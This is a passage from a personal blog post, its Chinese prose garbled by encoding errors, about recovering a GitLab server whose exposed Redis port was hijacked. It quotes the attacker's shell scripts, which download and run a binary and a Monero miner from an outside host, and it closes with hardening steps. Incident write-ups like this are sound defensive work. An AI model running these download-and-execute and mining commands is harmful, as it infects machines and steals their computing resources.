<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/tmp/ddg.217"</span> ]; <span class="keyword">then</span></div><div class="line">    curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /tmp/ddg.217 &amp;&amp; /tmp/ddg.217</div><div class="line">killall /tmp/ddg.216</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="_">-d</span> <span class="string">"/opt/yam"</span> ]; <span class="keyword">then</span></div><div class="line">    rm -rf /opt/yam</div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
<p>ç¬¬äºŒä¸ªç—…æ¯’æ–‡ä»¶ï¼Œåå‘ä»£ç†è‚‰é¸¡çš„æœ¨é©¬ï¼Œä¹ŸåŠ å¯†è¿‡çš„ã€‚ä¸‹è½½æ”¾åˆ°/tmp/ä¸‹é¢ è¿™ä¸ªæ˜¯ä¸´æ—¶æ–‡ä»¶ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">DoMiner</span></span>()</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/tmp/AnXqV"</span> ]; <span class="keyword">then</span></div><div class="line">        curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV</div><div class="line">    <span class="keyword">fi</span></div><div class="line">    chmod +x /tmp/AnXqV</div><div class="line">    /tmp/AnXqV -B <span class="_">-a</span> cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrND<span class="built_in">fg</span>MKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x</div><div class="line">&#125;</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC"</span> || DoMiner</div></pre></td></tr></table></figure>
<p>å¯¹æ–¹é…ç½®çš„é˜²ç«å¢™è§„åˆ™ï¼š</p>
<p>6379 æœ¬åœ°è®¿é—®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">DoRedis6379</span></span>()</div><div class="line">&#123;</div><div class="line">    iptables -F REDIS6379</div><div class="line">    iptables -A REDIS6379 -p tcp <span class="_">-s</span> 127.0.0.1 --dport 6379 -j ACCEPT    //åªå…è®¸127.0.0.1è®¿é—®6379</div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    <span class="comment">#iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT</span></div><div class="line">    iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT</div><div class="line">    iptables -I INPUT -j REDIS6379</div><div class="line">&#125;</div><div class="line">iptables -D OUTPUT -j REDIS6379</div><div class="line">iptables -F REDIS6379</div><div class="line">iptables -X REDIS6379</div><div class="line">iptables -D INPUT -j REDIS63792</div><div class="line">iptables -F REDIS63792</div><div class="line">iptables -X REDIS63792</div><div class="line"><span class="comment">#iptables -N REDIS6379 &amp;&amp; DoRedis6379</span></div></pre></td></tr></table></figure>
<p>åˆ é™¤è¿™äº›æ–‡ä»¶ï¼Œåœ¨çœ‹çœ‹å°±æ²¡é—®é¢˜äº†ï¼Œåé¢æŠŠredisè®¾ç½®äº†ã€‚ æˆ‘ä»¬å½“åˆè®¾ç½®äº†åå‘ä»£ç†å’Œé˜²ç«å¢™è§„åˆ™ï¼Œæƒé™è®¾ç½®äº†å¾ˆç»†ï¼Œåªèƒ½æ™®é€šç”¨æˆ·å¯åŠ¨æœåŠ¡ã€‚</p>
<p>æ€»ç»“ï¼š</p>
<p>è¿™æ¬¡å‘ç”Ÿç ´ç­æ€§çš„æ”»å‡»ï¼Œæ€»ç»“ç»éªŒè¿™é‡Œgitlabèµ°rediså•ç‹¬èµ°æœ¬åœ°ï¼šè®¾ç½®ï¼šbindå•ç‹¬æœ¬åœ°è·‘ã€‚127.0.0.1 ç¬¬äºŒï¼šæ™®é€šç”¨æˆ·å¯åŠ¨redisï¼Œç¬¬ä¸‰ï¼šè®¾ç½®é˜²ç«å¢™ã€‚ </p>

	

	
		<span class="different-posts"><a href="/2016/12/02/è¿ç»´å®‰å…¨/gitlabç½‘ç«™è¢«é»‘redisè¢«åŠ«æŒ6379ç«¯å£éœ€è¦æäº¤è®¤è¯ï¼Œå¦‚ä½•æŒ½æ•‘ï¼Ÿ/" onclick="window.history.go(-1); return false;">â¬…ï¸ Go back </a></span>

	

</article>

	</main>

	<footer class="footer">
	<div class="footer-content">
		
	      <div class="footer__element">
	<h5>Hi there,</h5>
	<p style="text-align:justify;">my name is Yancy, they know me as RadiantğŸ‘ğŸ‘. This blog is about Bi-data and my live.<br> I like ğŸŒ³ğŸŒ³ğŸŒ³</p>
</div>


	    
	      <div class="footer__element">
	<h5>Check out</h5>
	<ul class="footer-links">
		<li class="footer-links__link"><a href="/archives">Archive</a></li>
		
		  <li class="footer-links__link"><a href="/atom.xml">RSS</a></li>
	    
		<li class="footer-links__link"><a href="/about">about page</a></li>
		<li class="footer-links__link"><a href="/tags">Tags</a></li>
		<li class="footer-links__link"><a href="/categories">Categories</a></li>
	</ul>
</div>

	    

		<div class="footer-credit">
			<span>Â© 2018 Yancy | Powered by <a href="http://blog.yancy.cc/">Yancy</a> | Theme <a href="https://github.com/yangcvo">Yancy_GitHub</a></span>
		</div>

	</div>


</footer>



</body>

</html>
